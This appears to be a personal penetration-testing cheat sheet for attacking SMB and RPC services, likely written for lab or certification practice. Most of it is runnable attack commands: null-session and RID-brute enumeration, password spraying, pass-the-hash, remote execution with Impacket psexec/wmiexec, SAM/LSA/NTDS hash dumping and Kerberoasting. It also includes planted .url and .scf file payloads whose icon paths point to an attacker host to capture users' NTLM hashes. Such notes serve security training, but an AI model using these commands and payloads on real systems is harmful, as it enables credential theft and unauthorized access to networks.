# RPC/SMB

- try null logins (anonymous logins)
- credentials can sometimes be re-used or repeat credentials set (eg. ftp:ftp, admin:admin, smb:smb)
- can you upload files? maybe a URI attack? 

## Nmap Scripts

```bash
nmap -sV -sC -p 139,445 <target ip>

# useful specific scripts
nmap --script smb-enum-shares,smb-enum-users -p 445 <target ip>
nmap --script smb-vuln* -p 445 <target ip>              # EternalBlue, ms08-067, ms17-010 etc
nmap --script smb-os-discovery -p 445 <target ip>        # OS version, domain, hostname
nmap --script smb-protocols -p 445 <target ip>           # SMBv1/v2/v3
```

## Enumeration

```bash
smbclient -N -L \\<target ip>\ # you should always consider using this. sometimes nxc and enum4linux-ng doesnt work properly

smb> recurse
smb> prompt off
smb>mget * 

# alternative smbclient one liner to recursive download
smbclient //<ip>/<share> -U <domain>/<user> -c 'prompt OFF;recurse ON;mget *'

# OR my preferred method
nxc smb <target ip> -u '' -p '' --shares

# also try guest account
nxc smb <target ip> -u 'guest' -p '' --shares

# if can access, use the spider module
nxc smb <target ip> -u '' -p '' --spider <share name> --regex .

# to list all readable files
nxc smb <target ip> -u '' -p '' -M spider_plus

#add -o DOWNLOAD_FLAG=True to download all files

enum4linux-ng -A <targetip> -R # the new enum4linux does not do RID cycling by default and thus can miss out users. add the -R to get RID cycling!
```

## RPC Enumeration (port 135/139)

```bash
# null session RPC
rpcclient -U '' -N <target ip>

# useful rpcclient commands once connected
rpcclient> enumdomusers          # list domain users
rpcclient> enumdomgroups         # list domain groups
rpcclient> querygroupmem 0x200   # list members of a group (RID in hex)
rpcclient> queryuser 0x1f4       # query specific user
rpcclient> getdompwinfo          # password policy
rpcclient> netshareenumall       # list all shares

# impacket RPC enumeration
impacket-rpcdump <target ip>
impacket-samrdump <target ip>

# RID brute force to find users (when enum4linux misses them)
impacket-lookupsid ''@<target ip>
impacket-lookupsid '<user>:<password>'@<target ip>

# nxc RID brute
nxc smb <target ip> -u '' -p '' --rid-brute
nxc smb <target ip> -u 'guest' -p '' --rid-brute
```

```bash
# if you can upload files, try running responder and then do this

create a file (name it as offsec.url for example)

# inside that file
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\<attacker ip>\%USERNAME%.icon
IconIndex=1

# upload offsec.url into the share
If this works you should see the username and hash (might need to wait a while)

# also try .scf files
[Shell]
Command=2
IconFile=\\<attacker ip>\share\icon.ico
[Taskbar]

# save as @evil.scf (@ makes it sort to top of directory)
```

- if not, wait till you have some creds and try again
- If you get a share name that looks unique, it could be a potential directory on a HTTP server (i.e. the Shenzi box)

## Impacket Suite (with creds)

```bash
# PSExec - needs write access to ADMIN$ or C$
impacket-psexec <user>:<password>@<ip>
impacket-psexec <domain>/<user>:<password>@<ip>

# pass the hash
impacket-psexec <user>@<ip> -hashes LM:NT
impacket-psexec <user>@<ip> -hashes :NT

# WMIExec - more stealthy, no service creation
impacket-wmiexec <user>:<password>@<ip>
impacket-wmiexec <user>@<ip> -hashes :NT

# SMBExec - uses SMB only
impacket-smbexec <user>:<password>@<ip>

# ATExec - uses Task Scheduler
impacket-atexec <user>:<password>@<ip> "command"

# SecretsDump - dump SAM/NTDS hashes remotely
impacket-secretsdump <user>:<password>@<ip>
impacket-secretsdump <user>@<ip> -hashes :NT

# GetNPUsers - AS-REP roasting (no creds needed if you have usernames)
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <ip>

# GetUserSPNs - Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request
```

## NXC with Creds

```bash
# check if creds work
nxc smb <ip> -u <user> -p <password>

# password spray
nxc smb <ip> -u users.txt -p 'Password123!' --no-bruteforce

# check local admin access (Pwn3d! in output)
nxc smb <ip> -u <user> -p <password>

# dump SAM
nxc smb <ip> -u <user> -p <password> --sam

# dump LSA
nxc smb <ip> -u <user> -p <password> --lsa

# pass the hash
nxc smb <ip> -u <user> -H <NT hash>

# execute commands
nxc smb <ip> -u <user> -p <password> -x "whoami"
```
